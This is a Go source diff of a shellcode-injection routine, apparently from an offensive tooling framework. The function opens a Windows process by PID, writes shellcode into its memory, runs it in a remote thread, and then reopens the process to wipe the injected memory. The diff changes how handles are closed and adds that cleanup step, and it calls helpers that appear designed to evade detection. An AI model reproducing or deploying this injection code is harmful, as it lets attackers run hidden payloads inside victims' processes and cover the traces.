@@ -14,21 +14,24 @@ import (
 	"project/internal/security"
 )
 
-// InjectShellcode is used to inject shellcode to a process.
-// It will block until shellcode execute finish.
-// warning: shellcode slice will be covered.
+// InjectShellcode is used to inject shellcode to a process, it will block until execute finish.
+// [Warning]: shellcode slice will be covered.
 func InjectShellcode(pid uint32, shellcode []byte) error {
 	defer security.CoverBytes(shellcode)
+	// --------------------------------------write shellcode---------------------------------------
 	// open target process
-	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
-		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
-		windows.PROCESS_VM_READ | windows.SYNCHRONIZE
+	da := uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
+		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ)
 	pHandle, err := api.OpenProcess(da, false, pid)
 	if err != nil {
 		return err
 	}
-	defer func() { api.CloseHandle(pHandle) }()
-
+	var closeProcessHandle bool
+	defer func() {
+		if !closeProcessHandle {
+			api.CloseHandle(pHandle)
+		}
+	}()
 	// alloc memory for shellcode
 	doneVA := security.SwitchThreadAsync()
 	scSize := uintptr(len(shellcode))
@@ -44,7 +47,12 @@ func InjectShellcode(pid uint32, shellcode []byte) error {
 	if err != nil {
 		return err
 	}
-	defer func() { api.CloseHandle(tHandle) }()
+	var closeThreadHandle bool
+	defer func() {
+		if !closeThreadHandle {
+			api.CloseHandle(tHandle)
+		}
+	}()
 	// write shellcode
 	doneWPM := security.SwitchThreadAsync()
 	rand := random.NewRand()
@@ -74,11 +82,27 @@ func InjectShellcode(pid uint32, shellcode []byte) error {
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 	security.WaitSwitchThreadAsync(ctx, doneVA, doneCRT, doneWPM, doneVP, doneRT)
+	// ----------------------------------------wait thread-----------------------------------------
+	// close process handle at once and reopen after execute finish
+	api.CloseHandle(pHandle)
+	closeProcessHandle = true
 	// wait thread for wait shellcode execute finish
 	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
 	if err != nil {
 		return errors.Wrap(err, "failed to wait thread")
 	}
+	// close thread handle at once
+	api.CloseHandle(tHandle)
+	closeThreadHandle = true
+	// ----------------------------------------clean memory----------------------------------------
+	// reopen target process, maybe failed like process is terminated
+	da = windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION |
+		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
+	pHandle, err = api.OpenProcess(da, false, pid)
+	if err != nil {
+		return err
+	}
+	defer func() { api.CloseHandle(pHandle) }()
 	// clean shellcode and free it
 	doneVP = security.SwitchThreadAsync()
 	err = api.VirtualProtectEx(pHandle, memAddr, scSize, windows.PAGE_READWRITE, oldProtect)
